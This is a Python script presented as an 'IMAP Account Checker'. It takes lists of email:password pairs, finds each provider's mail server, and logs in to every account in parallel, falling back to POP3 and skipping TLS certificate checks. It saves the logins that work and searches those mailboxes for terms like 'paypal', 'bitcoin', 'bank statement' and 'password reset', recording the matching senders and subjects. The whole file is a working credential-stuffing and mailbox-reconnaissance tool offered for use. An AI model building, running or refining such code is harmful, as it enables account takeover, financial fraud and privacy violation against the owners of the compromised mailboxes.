#!/usr/bin/env python3
"""
IMAP Account Checker
────────────────────
Reads email:password pairs from a file, auto-detects the IMAP server,
validates each account (hit / invalid) and optionally searches keywords.

Usage:
  python checker.py accounts.txt
  python checker.py accounts.txt -t 20 --timeout 8 -k "paypal,bitcoin,invoice"
  python checker.py accounts.txt -o results/ -k "password reset,bank"
"""

import imaplib
import poplib
import ssl
import sys
import argparse
import socket
import re
import os
import time
import urllib.request
import xml.etree.ElementTree as ET
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

from providers import KNOWN_PROVIDERS, FALLBACK_PATTERNS

# ── ANSI colours ──────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

_print_lock = Lock()


def cprint(*args, **kwargs):
    with _print_lock:
        print(*args, **kwargs)


# ── Provider detection ────────────────────────────────────────────────────────

_tb_cache: dict[str, dict] = {}


def _thunderbird_fetch(domain: str, timeout: int = 5) -> dict:
    """Query Mozilla ISPDB and cache both IMAP and POP3 configs for a domain."""
    if domain in _tb_cache:
        return _tb_cache[domain]
    result: dict = {"imap": None, "pop3": None}
    try:
        url = f"https://autoconfig.thunderbird.net/v1.1/{domain}"
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            root = ET.fromstring(resp.read())
        for server in root.iter("incomingServer"):
            stype = server.get("type")
            host = server.findtext("hostname")
            port_str = server.findtext("port")
            if host and port_str and stype in ("imap", "pop3") and result[stype] is None:
                result[stype] = {"host": host, "port": int(port_str)}
    except Exception:
        pass
    _tb_cache[domain] = result
    return result


def resolve_fallback(domain: str, port: int = 993, timeout: int = 5):
    """Try common hostname patterns until one resolves via DNS."""
    for pattern in FALLBACK_PATTERNS:
        host = pattern.format(domain=domain)
        try:
            socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM,
                               proto=0, flags=socket.AI_ADDRCONFIG)
            return {"host": host, "port": port}
        except socket.gaierror:
            continue
    return None


def get_imap_config(email_addr: str, dns_timeout: int = 5):
    """Return (domain, imap_cfg | None). Detection order: known DB → Thunderbird → DNS."""
    domain = email_addr.split("@")[-1].lower().strip()
    if domain in KNOWN_PROVIDERS:
        return domain, KNOWN_PROVIDERS[domain]
    tb = _thunderbird_fetch(domain)
    if tb["imap"]:
        return domain, tb["imap"]
    old_timeout = socket.getdefaulttimeout()
    socket.setdefaulttimeout(dns_timeout)
    try:
        cfg = resolve_fallback(domain)
    finally:
        socket.setdefaulttimeout(old_timeout)
    return domain, cfg


# ── IMAP operations ───────────────────────────────────────────────────────────

def _make_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def imap_login(host: str, port: int, user: str, password: str, timeout: int):
    """Try to connect and login. Returns (ok: bool, error: str | None)."""
    try:
        conn = imaplib.IMAP4_SSL(host, port, ssl_context=_make_ssl_ctx(),
                                  timeout=timeout)
        conn.login(user, password)
        conn.logout()
        return True, None
    except imaplib.IMAP4.error as e:
        return False, str(e)
    except (ConnectionRefusedError, TimeoutError,
            socket.timeout, socket.gaierror, OSError) as e:
        return False, f"conn: {e}"
    except Exception as e:
        return False, f"err: {e}"


def _is_imap_disabled(err: str) -> bool:
    """True when IMAP is structurally disabled, not a wrong-password error."""
    el = err.lower()
    return ("disabled" in el or
            "not enabled" in el or
            "mechanism is not supported" in el)


def _pop3_host(imap_host: str, domain: str) -> str | None:
    """Return POP3 hostname: Thunderbird cache first, then derivation, or None to skip."""
    if "office365" in imap_host or "outlook.com" in imap_host:
        return None  # Microsoft disabled basic auth on POP3 too
    tb = _tb_cache.get(domain)
    if tb and tb.get("pop3"):
        return tb["pop3"]["host"]
    if imap_host.startswith("imap."):
        return "pop3." + imap_host[5:]
    if imap_host.startswith("imap"):
        return "pop3" + imap_host[4:]
    return f"pop3.{domain}"


def pop3_login(host: str, port: int, user: str, password: str, timeout: int):
    """Try POP3 login. Returns (ok: bool, error: str | None)."""
    try:
        conn = poplib.POP3_SSL(host, port, context=_make_ssl_ctx(), timeout=timeout)
        conn.user(user)
        conn.pass_(password)
        conn.quit()
        return True, None
    except poplib.error_proto as e:
        return False, str(e)
    except (ConnectionRefusedError, TimeoutError,
            socket.timeout, socket.gaierror, OSError) as e:
        return False, f"conn: {e}"
    except Exception as e:
        return False, f"err: {e}"


def search_keywords(host: str, port: int, user: str, password: str,
                    keywords: list[str], timeout: int) -> list[dict]:
    """Login, scan INBOX + other folders, return matching email summaries."""
    matches = []
    try:
        conn = imaplib.IMAP4_SSL(host, port, ssl_context=_make_ssl_ctx(),
                                  timeout=timeout)
        conn.login(user, password)

        folders = ["INBOX"]
        try:
            _, raw_list = conn.list()
            for item in raw_list or []:
                if not item:
                    continue
                decoded = item.decode(errors="replace")
                m = re.search(r'"([^"]+)"\s*$|(\S+)\s*$', decoded)
                if m:
                    folder = (m.group(1) or m.group(2)).strip().strip('"')
                    if folder and folder not in folders:
                        folders.append(folder)
        except Exception:
            pass

        for folder in folders[:8]:
            try:
                conn.select(folder, readonly=True)
            except Exception:
                continue

            for kw in keywords:
                for criterion in [f'SUBJECT "{kw}"', f'TEXT "{kw}"']:
                    try:
                        _, ids_raw = conn.search(None, criterion)
                        msg_ids = ids_raw[0].split() if ids_raw and ids_raw[0] else []
                        for mid in msg_ids[:5]:
                            try:
                                _, data = conn.fetch(
                                    mid,
                                    "(BODY[HEADER.FIELDS (SUBJECT FROM DATE)])"
                                )
                                if not data or not data[0]:
                                    continue
                                header = data[0][1].decode(errors="replace")
                                subj_m = re.search(r"Subject:\s*(.+)", header, re.IGNORECASE)
                                frm_m  = re.search(r"From:\s*(.+)", header, re.IGNORECASE)
                                subj = subj_m.group(1).strip()[:120] if subj_m else "N/A"
                                frm  = frm_m.group(1).strip()[:80]  if frm_m  else "N/A"
                                matches.append({
                                    "keyword": kw,
                                    "folder":  folder,
                                    "subject": subj,
                                    "from":    frm,
                                })
                            except Exception:
                                continue
                    except Exception:
                        continue

        conn.logout()
    except Exception:
        pass
    return matches


# ── Worker ────────────────────────────────────────────────────────────────────

def check_account(line: str, idx: int, total: int,
                  keywords: list[str], timeout: int,
                  hits_fh, invalids_fh,
                  kw_files: dict,
                  stats: dict):
    line = line.strip()
    if not line or ":" not in line:
        return

    email, _, password = line.partition(":")
    email = email.strip()
    password = password.strip()

    if not email or not password or "@" not in email:
        return

    domain, cfg = get_imap_config(email)
    prefix = f"[{idx}/{total}]"

    if cfg is None:
        cprint(f"{DIM}{prefix} {YELLOW}UNKNOWN {RESET}{email}  "
               f"(no IMAP server found for {domain})")
        with _print_lock:
            stats["unknown"] += 1
        return

    host, port = cfg["host"], cfg["port"]
    ok, err = imap_login(host, port, email, password, timeout)

    # POP3 fallback when IMAP is structurally disabled (not a wrong password)
    proto = "IMAP"
    pop3_host_used = None
    if not ok and _is_imap_disabled(err):
        ph = _pop3_host(host, domain)
        if ph:
            pop3_ok, pop3_err = pop3_login(ph, 995, email, password, timeout)
            if pop3_ok:
                ok, err, proto, pop3_host_used = True, None, "POP3", ph

    if ok:
        with _print_lock:
            stats["hits"] += 1
            hits = stats["hits"]

        used_host = pop3_host_used or host
        cprint(f"{prefix} {BOLD}{GREEN}HIT{RESET}  {email}  "
               f"{DIM}[{used_host}|{proto}]{RESET}  "
               f"{GREEN}HITS: {hits}{RESET}")
        with _print_lock:
            hits_fh.write(f"{email}:{password}\n")
            hits_fh.flush()

        if keywords and kw_files and proto == "IMAP":
            found = search_keywords(host, port, email, password, keywords, timeout + 10)
            if found:
                kw_counts: dict[str, int] = {}
                with _print_lock:
                    for m in found:
                        fh = kw_files.get(m["keyword"])
                        if fh:
                            fh.write(
                                f"{email}:{password} | {m['folder']} | "
                                f"FROM: {m['from']} | SUBJ: {m['subject']}\n"
                            )
                            fh.flush()
                        kw_counts[m["keyword"]] = kw_counts.get(m["keyword"], 0) + 1
                summary = ", ".join(f"{k}:{v}" for k, v in kw_counts.items())
                cprint(f"    {CYAN}↳ keywords found: {summary}{RESET}")
    else:
        with _print_lock:
            stats["invalids"] += 1
        cprint(f"{DIM}{prefix} INVALID  {email}  ({err}){RESET}")
        with _print_lock:
            invalids_fh.write(f"{email}:{password}\n")
            invalids_fh.flush()


# ── Entry point ───────────────────────────────────────────────────────────────

def banner():
    print(f"""
{BOLD}{CYAN}╔{'═' * 42}╗
║        IMAP Account Checker              ║
╚{'═' * 42}╝{RESET}
""")


def safe_filename(name: str) -> str:
    """Sanitize a keyword into a safe filename."""
    return re.sub(r'[^\w\-]', '_', name).strip("_") or "keyword"


def parse_args():
    p = argparse.ArgumentParser(
        description="IMAP credential checker with keyword search",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python checker.py accounts.txt
  python checker.py accounts.txt -t 30 --timeout 8
  python checker.py accounts.txt -k "paypal,bitcoin,invoice" -o results/
  python checker.py accounts.txt -t 50 -k "password,bank statement" -n moncheck
        """
    )
    p.add_argument("input", help="File with email:password lines")
    p.add_argument("-t", "--threads", type=int, default=10,
                   help="Concurrent threads (default: 10)")
    p.add_argument("--timeout", type=int, default=10,
                   help="IMAP connection timeout in seconds (default: 10)")
    p.add_argument("-k", "--keywords",
                   help="Comma-separated keywords to search in valid mailboxes")
    p.add_argument("-o", "--output", default="results",
                   help="Base output directory (default: results/)")
    p.add_argument("-n", "--name",
                   help="Run name override (default: timestamp)")
    return p.parse_args()


def main():
    banner()
    args = parse_args()

    input_path = Path(args.input)
    if not input_path.exists():
        print(f"{RED}Error: file not found: {args.input}{RESET}")
        sys.exit(1)

    lines = [l for l in input_path.read_text(errors="replace").splitlines()
             if l.strip() and ":" in l]

    if not lines:
        print(f"{YELLOW}No valid email:password lines found in {args.input}{RESET}")
        sys.exit(0)

    keywords = [k.strip() for k in args.keywords.split(",") if k.strip()] \
        if args.keywords else []

    # Timestamped run directory
    run_name = args.name if args.name else datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    run_dir  = Path(args.output) / run_name
    run_dir.mkdir(parents=True, exist_ok=True)

    hits_path     = run_dir / "hits.txt"
    invalids_path = run_dir / "invalids.txt"

    # One file per keyword inside keywords/
    kw_dir   = run_dir / "keywords" if keywords else None
    kw_files = {}
    if kw_dir:
        kw_dir.mkdir(exist_ok=True)
        for kw in keywords:
            kw_files[kw] = open(kw_dir / f"{safe_filename(kw)}.txt", "w")

    print(f"  {BOLD}Input   {RESET}: {input_path} ({len(lines)} accounts)")
    print(f"  {BOLD}Threads {RESET}: {args.threads}")
    print(f"  {BOLD}Timeout {RESET}: {args.timeout}s")
    if keywords:
        print(f"  {BOLD}Keywords{RESET}: {', '.join(keywords)}")
    print(f"  {BOLD}Run dir {RESET}: {run_dir}/\n")

    stats = {"hits": 0, "invalids": 0, "errors": 0, "unknown": 0}
    start = time.time()

    try:
        with (open(hits_path, "w") as hits_fh,
              open(invalids_path, "w") as invalids_fh):

            with ThreadPoolExecutor(max_workers=args.threads) as pool:
                futures = {
                    pool.submit(
                        check_account,
                        line, idx + 1, len(lines),
                        keywords, args.timeout,
                        hits_fh, invalids_fh,
                        kw_files,
                        stats
                    ): line
                    for idx, line in enumerate(lines)
                }
                for f in as_completed(futures):
                    try:
                        f.result()
                    except Exception as e:
                        with _print_lock:
                            stats["errors"] += 1
                        cprint(f"{RED}Worker error: {e}{RESET}")
    finally:
        for fh in kw_files.values():
            fh.close()

    elapsed = time.time() - start
    total_checked = stats["hits"] + stats["invalids"] + stats["unknown"] + stats["errors"]

    print(f"""
{BOLD}{'═' * 50}{RESET}
  {GREEN}{BOLD}HITS     {RESET}: {stats['hits']}
  {RED}Invalid  {RESET}: {stats['invalids']}
  {YELLOW}Unknown  {RESET}: {stats['unknown']}
  Total    : {total_checked} / {len(lines)}
  Time     : {elapsed:.1f}s
{BOLD}{'═' * 50}{RESET}

  {BOLD}hits.txt    {RESET}→ {hits_path}
  {BOLD}invalids.txt{RESET}→ {invalids_path}""")
    if kw_dir:
        print(f"  {BOLD}keywords/   {RESET}→ {kw_dir}/")
        for kw in kw_files:
            kw_path = kw_dir / f"{safe_filename(kw)}.txt"
            size = kw_path.stat().st_size if kw_path.exists() else 0
            print(f"               {DIM}{safe_filename(kw)}.txt  ({size} bytes){RESET}")
    print()


if __name__ == "__main__":
    main()
